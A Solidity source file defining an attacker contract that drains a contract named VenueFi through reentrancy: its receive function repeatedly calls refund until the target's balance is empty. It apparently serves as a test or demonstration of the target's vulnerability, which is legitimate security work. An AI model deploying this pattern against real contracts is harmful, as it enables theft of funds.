// AttackerVenueFi.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../VenueFi.sol";

contract AttackerVenueFi {
    VenueFi public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = VenueFi(_target);
    }

    function doInvest() external payable {
        target.invest{value: msg.value}();
        attackAmount = msg.value;
    }

    function attack() external {
        target.refund(attackAmount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.refund(attackAmount);
        }
    }
}